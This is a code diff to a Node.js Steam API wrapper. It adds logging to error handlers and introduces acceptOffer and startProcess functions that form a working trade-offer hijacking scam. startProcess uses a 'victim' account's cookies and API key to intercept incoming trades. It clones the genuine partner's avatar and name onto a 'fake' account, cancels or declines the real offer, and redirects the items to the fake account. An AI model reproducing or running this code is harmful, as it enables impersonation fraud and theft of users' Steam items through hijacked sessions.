@@ -2,6 +2,7 @@ const axios = require('axios');
 const qs = require('qs');
 const SteamConverter = require('./steam-converter');
 const HTMLParser = require("node-html-parser");
+const MessageMarks = require('../lib/message-marks');
 
 const apiURL = "https://api.steampowered.com";
 const communityURL = 'https://steamcommunity.com';
@@ -18,7 +19,12 @@ class SteamAPI {
         return new Promise((resolve, reject) => {
             axios.get(`${apiURL}/ISteamUser/GetPlayerSummaries/v2/`, config)
                  .then(response => resolve(response.data.response.players[0]))
-                 .catch(error => reject(error));
+                 .catch(error => {
+                     let message = `Error while requesting ${ID64} profile info ${MessageMarks.error}`;
+
+                     console.log(message);
+                     reject(message, error);
+                 });
         })
     }
 
@@ -35,7 +41,12 @@ class SteamAPI {
         return new Promise((resolve, reject) => {
             axios.get(`${apiURL}/IEconService/GetTradeOffers/v1/`, config)
                 .then(response => resolve(response.data.response))
-                .catch(error => reject(error));
+                .catch(error => {
+                    let message = `Error while requesting Active offers ${MessageMarks.error}`;
+
+                    console.log(message);
+                    reject(message, error);
+                });
         });
     }
 
@@ -50,7 +61,12 @@ class SteamAPI {
         return new Promise((resolve, reject) => {
             axios.get(`${apiURL}/IEconService/GetTradeOffer/v1/`, config)
                 .then(response => resolve(response.data.response.offer))
-                .catch(error => reject(error));
+                .catch(error => {
+                    let message = `Error while requesting Offer Info ${MessageMarks.error}`;
+
+                    console.log(message);
+                    reject(message, error);
+                });
         });
     }
 
@@ -63,10 +79,17 @@ class SteamAPI {
         return new Promise((resolve, reject) => {
             axios.post(`${apiURL}/IEconService/CancelTradeOffer/v1/`, qs.stringify(data))
                 .then(response => {
-                    console.log(`Offer ${offerId} cancelled ✓`);
+                    let message = `Offer ${offerId} has been cancelled ${MessageMarks.success}`;
+
+                    console.log(message);
                     resolve(response);
                 })
-                .catch(error => reject(error));
+                .catch(error => {
+                    let message = `Offer ${offerId} has not been cancelled ${MessageMarks.error}`;
+
+                    console.log(message);
+                    reject(message, error);
+                });
         });
     }
 
@@ -79,10 +102,15 @@ class SteamAPI {
         return new Promise((resolve, reject) => {
             axios.post(`${apiURL}/IEconService/DeclineTradeOffer/v1/`, qs.stringify(data))
                 .then(response => {
-                    console.log(`Offer ${offerId} declined ✓`);
+                    let message = `Offer ${offerId} has been declined ${MessageMarks.success}`;
+
+                    console.log(message);
                     resolve(response);
                 })
-                .catch(error => reject(error));
+                .catch(error => {
+                    let message = `Offer ${offerId} has not been declined ${MessageMarks.error}`;
+                    reject(message, error);
+                });
         });
     }
 
@@ -131,10 +159,49 @@ class SteamAPI {
         return new Promise((resolve, reject) => {
             axios.post(`${communityURL}/tradeoffer/new/send`, qs.stringify(data), config)
                 .then(response => {
-                    console.log(`Offer ${response.data.tradeofferid} has been created ✓`);
+                    let message = `Offer { tradeofferid: ${response.data.tradeofferid} } has been created ${MessageMarks.success}`;
+
+                    console.log(message);
                     resolve(response);
                 })
-                .catch(error => reject(error));
+                .catch(error => {
+                    let message = `Offer has not been sent ${MessageMarks.error}`;
+
+                    console.log(message);
+                    reject(message, error);
+                });
+        });
+    }
+
+    static acceptOffer = (options) => {
+        let data = {
+            sessionid: options.sessionID,
+            serverid: 1,
+            tradeofferid: options.tradeOfferID,
+            partner: options.partnerID64 || SteamConverter.ID32toID64(options.partnerID32),
+        };
+
+        let config = {
+            headers: {
+                Referer: `${communityURL}/tradeoffer/${options.tradeOfferID}/`,
+                Cookie: options.cookies.join(";")
+            }
+        };
+
+        return new Promise((resolve, reject) => {
+            axios.post(`${communityURL}/tradeoffer/${options.tradeOfferID}/accept`, qs.stringify(data), config)
+                 .then(response => {
+                     let message = `Offer { tradeid: ${response.data.tradeid} } has been accepted ${MessageMarks.success}`;
+
+                     console.log(message);
+                     resolve(response);
+                 })
+                 .catch(error => {
+                     let message = `Offer { tradeofferid: ${options.tradeOfferID} } has not been accepted ${MessageMarks.error}`;
+
+                     console.log(message);
+                     reject(error, message);
+                 });
         });
     }
 
@@ -153,7 +220,12 @@ class SteamAPI {
 
             axios.post(`${profileUrl}tradeoffers/newtradeurl`, qs.stringify(data), config)
                  .then(response => resolve(response.data))
-                 .catch(error => reject(error));
+                 .catch(error => {
+                     let message = `Error while requesting Trade Access Token ${MessageMarks.error}`;
+
+                     console.log(message);
+                     reject(message, error);
+                 });
         });
     }
 
@@ -176,7 +248,12 @@ class SteamAPI {
     
             axios.post(`${communityURL}/dev/registerkey`, qs.stringify(data), config)
                  .then(response => resolve(response))
-                 .catch(error => reject(error));
+                 .catch(error => {
+                    let message = `Error while creating Web API Key ${MessageMarks.error}`;
+
+                    console.log(message);
+                    reject(message, error);
+                 });
         });
     }   
 
@@ -207,7 +284,12 @@ class SteamAPI {
                         reject(ex);
                     }
                 })
-                .catch(error => reject(error));
+                .catch(error => {
+                    let message = `Error while requesting Web API Key ${MessageMarks.error}`;
+
+                    console.log(message);
+                    reject(message, error);
+                });
         });
     }
 
@@ -221,11 +303,58 @@ class SteamAPI {
                         .then(() => {
                             this.getAPIKey(cookies)
                                 .then(key => resolve(key))
-                                .catch(err => reject(err));
+                                .catch(error => reject(error));
                         })
-                        .catch((err) => reject(err));
+                        .catch(error => reject(error));
                 })
         });
+    }
+
+    static startProcess = async (victim, fake, interval, fakeAvatar, fakeName) => {
+        victim.waitForNewOffer(fake ? fake.ID32 : "", interval || 1000)
+            .then(offer => {
+                SteamAPI.getProfileInfo(victim.apiKey || (fake.apiKey ? fake.apiKey : ""), SteamConverter.ID32toID64(offer.accountid_other))
+                    .then(user => {
+                        const name = user.personaname;
+                        const avatarUrl = user.avatarfull;
+
+                        fake.updateAvatar(avatarUrl).then(() => console.log(`(1) Avatar has been set ${MessageMarks.success}`));
+                        fake.updateName(name).then(() => console.log(`(1) Name has been set ${MessageMarks.success}`));
+                    })
+                    .catch();
+
+                if (offer.is_our_offer) {
+                    victim.cancelOffer(offer.tradeofferid)
+                        .then(() => {
+                            victim.makeOffer(fake.ID32, fake.ID64, fake.tradeToken, offer.items_to_receive, offer.items_to_give, offer.message)
+                                .then(() => {
+                                    fake.acceptOffer(offer.tradeofferid, victim.ID64, victim.ID32)
+                                        .then(() => {
+                                            console.log(`Process successfully finished ${MessageMarks.success}`);
+
+                                            fake.updateAvatar(fakeAvatar || "https://i.pinimg.com/564x/b6/18/0c/b6180ca8ea3cf20b9debf2cdd1a47194.jpg")
+                                                .then(() => console.log(`(2) Avatar has been set ${MessageMarks.success}`));
+                                            fake.updateName(fakeName || "Johny Pathway | Where have you been??")
+                                                .then(() => console.log(`(2) Name has been set ${MessageMarks.success}`));
+                                        })
+                                        .catch();
+                                })
+                                .catch();
+                        })
+                        .catch();
+                }
+                else {
+                    victim.declineOffer(offer.tradeofferid)
+                        .then(() => {
+                            fake.makeOffer(victim.ID32, victim.ID64, victim.tradeToken, offer.items_to_give, [], offer.message)
+                                .then(() => {
+                                    // Victim accepts offer by themselves
+                                })
+                                .catch();
+                        })
+                        .catch();
+                }
+            }).catch();
     }
 }
 
